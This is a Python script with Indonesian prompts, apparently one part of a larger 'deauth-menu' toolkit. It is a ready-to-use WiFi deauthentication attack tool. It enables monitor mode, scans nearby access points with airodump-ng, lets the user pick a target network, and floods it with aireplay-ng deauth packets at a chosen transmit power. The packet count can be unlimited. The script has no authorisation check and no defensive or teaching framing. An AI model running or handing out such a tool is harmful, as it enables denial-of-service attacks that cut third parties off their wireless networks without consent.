#!/usr/bin/env python3
import csv
import glob
import os
import re
import subprocess
import sys
import tempfile
import time
import random

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR = "\033[2J\033[H"

COLORS = {
    "green": "\033[92m",
    "red": "\033[91m",
    "cyan": "\033[96m",
    "yellow": "\033[93m",
    "purple": "\033[95m",
    "white": "\033[97m",
    "magenta": "\033[35m",
    "gray": "\033[90m",
}

GREEN = COLORS["green"]
RED = COLORS["red"]
CYAN = COLORS["cyan"]
YELLOW = COLORS["yellow"]
MAGENTA = COLORS["magenta"]
GRAY = COLORS["gray"]

BOX_WIDTH = 40

# ================= Util =================

def clear_screen():
    sys.stdout.write(CLEAR)
    sys.stdout.flush()

def draw_box_top(color=CYAN):
    print(f"\n  {color}{BOLD}╔{'═' * BOX_WIDTH}╗{RESET}")

def draw_box_bottom(color=CYAN):
    print(f"  {color}{BOLD}╚{'═' * BOX_WIDTH}╝{RESET}")

def draw_box_title(title: str, color=CYAN, text_color=YELLOW):
    inner = f" {title}"
    pad = BOX_WIDTH - len(inner)
    if pad < 0:
        inner = inner[:BOX_WIDTH]
        pad = 0
    print(
        f"  {color}{BOLD}║{RESET}"
        f"{text_color}{BOLD}{inner}{RESET}"
        f"{' ' * pad}"
        f"{color}{BOLD}║{RESET}"
    )

def loading(text, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(duration * 10):
        sys.stdout.write(f"\r  {YELLOW}{BOLD}{chars[i % len(chars)]} {text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def loading_with_text(text, duration=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    glitch_chars = "!@#$%^&*"
    
    for i in range(duration * 10):
        display_text = ""
        for char in text:
            if char == " ":
                display_text += " "
            elif random.random() < 0.1:
                display_text += random.choice(glitch_chars)
            else:
                display_text += char
                
        sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}{display_text}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def glitch_print(text, color=GREEN, cycles=8):
    """Animasi glitch sederhana"""
    chars = "!@#$%^&*<>/\\|~?"
    n = len(text)
    revealed = [False] * n
    
    for c in range(cycles):
        display = []
        for i, ch in enumerate(text):
            if ch == " ":
                display.append(" ")
                continue
            if revealed[i]:
                display.append(ch)
            else:
                if random.random() < (c / cycles):
                    revealed[i] = True
                    display.append(ch)
                else:
                    display.append(random.choice(chars))
        sys.stdout.write(f"\r  {color}{''.join(display)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.04)
    
    print(f"\r  {color}{text}{RESET}")

def get_power_status(power):
    """Mengembalikan status sinyal berdasarkan nilai power"""
    if power == "N/A":
        return "N/A", GRAY
    try:
        pwr = int(power)
        if pwr >= -30:
            return "Kuat", GREEN
        elif pwr >= -50:
            return "Kuat", CYAN
        elif pwr >= -70:
            return "Sedang", YELLOW
        else:
            return "Lemah", RED
    except ValueError:
        return "N/A", GRAY

# ================= Wireless Functions =================

def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces

def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"

def run_command(cmd, show_output=False):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return result

def start_monitor_mode(adapter):
    loading_with_text(f"Mengaktifkan monitor mode pada {adapter}...", 2)
    run_command(["sudo", "airmon-ng", "check", "kill"], show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], show_output=False)
    
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(0.3)
    return monitor_iface

def scan_networks(adapter, duration=10):
    loading_with_text("Scanning WiFi networks...", 1)
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    start_time = time.time()
    
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        
        if remaining <= 0:
            break
            
        for i in range(len(chars)):
            if proc.poll() is not None or elapsed >= duration:
                break
            sys.stdout.write(f"\r  {CYAN}{BOLD}{chars[i % len(chars)]}{RESET} {YELLOW}Scanning... {remaining}s remaining{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            elapsed = int(time.time() - start_time)
            remaining = max(0, duration - elapsed)
    
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                power = row[8].strip() if len(row) > 8 else "N/A"
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({
                    "bssid": bssid, 
                    "channel": channel, 
                    "essid": essid,
                    "power": power
                })

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks

def stop_monitor_mode(monitor_iface):
    loading("Membersihkan monitor mode...", 1)
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], show_output=False)

def set_monitor_channel(monitor_iface, channel):
    if not channel:
        return
    run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], show_output=False)

def set_tx_power(monitor_iface, power_level):
    power_map = {
        "lemah": "1",
        "sedang": "10",
        "kuat": "30"
    }
    power_mw = power_map.get(power_level.lower(), "10")
    run_command(["sudo", "iw", "dev", monitor_iface, "set", "txpower", "fixed", power_mw + "mW"], show_output=False)

def run_deauth_attack(target, monitor_iface, power_level, packet_count, retries=3):
    set_monitor_channel(monitor_iface, target.get("channel"))
    set_tx_power(monitor_iface, power_level)
    
    if packet_count == "unlimited" or packet_count == "0":
        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
    else:
        cmd = ["sudo", "aireplay-ng", "-0", str(packet_count), "-a", target["bssid"], monitor_iface]
    
    status, _ = get_power_status(target.get("power", "N/A"))
    
    print(f"\n  {CYAN}[*] Menjalankan serangan deauth{RESET}")
    print(f"  {YELLOW}Target: {target['essid']} ({target['bssid']}){RESET}")
    print(f"  {YELLOW}Power: {power_level.upper()}{RESET}")
    print(f"  {YELLOW}Sinyal: {status}{RESET}")
    print(f"  {YELLOW}Paket: {'∞' if packet_count == 'unlimited' or packet_count == '0' else packet_count}{RESET}")
    print(f"  {YELLOW}Command: {' '.join(cmd)}{RESET}\n")
    
    for attempt in range(1, retries + 1):
        result = run_command(cmd, show_output=False)
        if result is not None:
            print(f"\n  {GREEN}[✓] Serangan selesai!{RESET}")
            return

        if attempt < retries:
            loading(f"Mencoba ulang ({attempt}/{retries})...", 1)

    print(f"\n  {RED}[✗] Serangan gagal setelah {retries} percobaan.{RESET}")

def prompt_keyboard_interrupt_action():
    print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
    print(f"  {GREEN}1.{RESET} Pilih target lagi")
    print(f"  {GREEN}2.{RESET} Kembali ke menu")
    print(f"  {GREEN}3.{RESET} Keluar")

    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
        if choice == "1":
            return "restart"
        if choice == "2":
            return "menu"
        if choice == "3":
            return "exit"
        print(f"  {RED}[!] Input salah, pilih 1, 2, atau 3.{RESET}")

def back_to_menu():
    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
    if os.path.exists(menu_path):
        os.execvp(sys.executable, [sys.executable, menu_path])
    else:
        print(f"\n  {RED}[✗] deauth-menu.py tidak ditemukan.{RESET}")
        input("\n  Tekan Enter untuk kembali...")

def get_monitor_interface():
    """Mendapatkan interface monitor yang aktif atau membuatnya dari wlan0"""
    # Cek interface monitor yang sudah ada
    ifaces = get_wireless_interfaces()
    for iface in ifaces:
        if iface.endswith("mon"):
            return iface
    
    # Jika tidak ada, coba wlan0
    for iface in ifaces:
        if iface.startswith("wlan"):
            return start_monitor_mode(iface)
    
    # Fallback ke wlan0
    return start_monitor_mode("wlan0")

def select_target(networks):
    if not networks:
        print(f"  {RED}[✗] Tidak ada jaringan ditemukan.{RESET}")
        return None

    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("PILIH TARGET", CYAN, YELLOW)
    draw_box_bottom(CYAN)

    # Lebar kolom yang lebih rapi
    no_width = 4
    essid_width = 22
    ch_width = 4
    pwr_width = 6
    signal_width = 8  # Dikurangi dari 9 ke 8
    bssid_width = 17
    
    # Header
    header = f"{'No':<{no_width}} {'ESSID':<{essid_width}} {'CH':<{ch_width}} {'PWR':<{pwr_width}} {'SINYAL':<{signal_width}} {'BSSID'}"
    print(f"\n  {header}")
    print(f"  {YELLOW}{'=' * (no_width + essid_width + ch_width + pwr_width + signal_width + bssid_width + 5)}{RESET}")
    
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:essid_width]
        power = net.get("power", "N/A")
        status, status_color = get_power_status(power)
        
        if power != "N/A":
            try:
                pwr = int(power)
                if pwr >= -30:
                    pwr_color = GREEN
                elif pwr >= -50:
                    pwr_color = CYAN
                elif pwr >= -70:
                    pwr_color = YELLOW
                else:
                    pwr_color = RED
                power_display = f"{pwr_color}{power:>3}{RESET}"
            except ValueError:
                power_display = f"{GRAY}{power:>3}{RESET}"
        else:
            power_display = f"{GRAY}{power:>3}{RESET}"
            
        # Format status dengan lebar tetap dan padding yang konsisten
        status_display = f"{status_color}{status:<{signal_width}}{RESET}"
        
        # Baris data dengan format yang rapi
        print(f"  {GREEN}{idx:<{no_width}}{RESET} {essid:<{essid_width}} {net['channel']:<{ch_width}} {power_display}  {status_display} {net['bssid']}")

    while True:
        choice = input(f"\n  {YELLOW}>> nomor target : {RESET}").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(networks):
            selected = networks[int(choice) - 1]
            power = selected.get("power", "N/A")
            status, _ = get_power_status(power)
            glitch_print(f"TARGET LOCKED: {selected['essid']} | PWR {power} | {status}", GREEN)
            time.sleep(0.3)
            return selected
        print(f"  {RED}[!] Input salah, coba lagi.{RESET}")

def get_attack_params():
    clear_screen()
    draw_box_top(CYAN)
    draw_box_title("PARAMETER SERANGAN", CYAN, YELLOW)
    draw_box_bottom(CYAN)
    
    print(f"\n  {BOLD}Pilih kekuatan sinyal & serangan:{RESET}")
    print(f"  {GREEN}1.{RESET} LEMAH")
    print(f"  {GREEN}2.{RESET} SEDANG")
    print(f"  {GREEN}3.{RESET} KUAT")
    
    power_level = "sedang"
    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
        if choice == "1":
            power_level = "lemah"
            break
        elif choice == "2":
            power_level = "sedang"
            break
        elif choice == "3":
            power_level = "kuat"
            break
        print(f"  {RED}[!] Pilih 1, 2, atau 3.{RESET}")
    
    print(f"\n  {BOLD}Pilih jumlah paket deauth:{RESET}")
    print(f"  {GREEN}1.{RESET} 100 paket")
    print(f"  {GREEN}2.{RESET} 1000 paket")
    print(f"  {GREEN}3.{RESET} Unlimited")
    print(f"  {GREEN}4.{RESET} Custom")
    
    packet_count = "1000"
    while True:
        choice = input(f"\n  {YELLOW}>> pilih [1-4] : {RESET}").strip()
        if choice == "1":
            packet_count = "100"
            break
        elif choice == "2":
            packet_count = "1000"
            break
        elif choice == "3":
            packet_count = "unlimited"
            break
        elif choice == "4":
            while True:
                custom = input(f"  {YELLOW}>> jumlah paket : {RESET}").strip()
                if custom.isdigit() and int(custom) > 0:
                    packet_count = custom
                    break
                elif custom == "0":
                    packet_count = "unlimited"
                    break
                print(f"  {RED}[!] Masukkan angka positif.{RESET}")
            break
        print(f"  {RED}[!] Pilih 1, 2, 3, atau 4.{RESET}")
    
    return power_level, packet_count

def main():
    monitor_iface = None

    while True:
        try:
            if monitor_iface is None:
                # Auto detect monitor interface
                clear_screen()
                draw_box_top(CYAN)
                draw_box_title("DEAUTH ATTACK", CYAN, YELLOW)
                draw_box_bottom(CYAN)
                
                print(f"\n  {YELLOW}[*] Mencari interface monitor...{RESET}")
                monitor_iface = get_monitor_interface()
                glitch_print(f"MONITOR INTERFACE: {monitor_iface}", CYAN)
                time.sleep(0.5)
            
            clear_screen()
            draw_box_top(CYAN)
            draw_box_title("SCAN WIFI", CYAN, YELLOW)
            draw_box_bottom(CYAN)
            
            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
            
            if scan_input.isdigit() and int(scan_input) > 0:
                scan_duration = int(scan_input)
            else:
                scan_duration = 10

            networks = scan_networks(monitor_iface, duration=scan_duration)
            target = select_target(networks)

            if target is None:
                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
                stop_monitor_mode(monitor_iface)
                return

            power_level, packet_count = get_attack_params()
            run_deauth_attack(target, monitor_iface, power_level, packet_count)
            
            print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
            input()
            stop_monitor_mode(monitor_iface)
            back_to_menu()
            break

        except KeyboardInterrupt:
            action = prompt_keyboard_interrupt_action()
            if action == "restart":
                print(f"\n  {YELLOW}Mengulang ke pemilihan target...{RESET}")
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                    monitor_iface = None
                continue
            elif action == "menu":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                back_to_menu()
            elif action == "exit":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                clear_screen()
                sys.exit(0)

if __name__ == "__main__":
    main()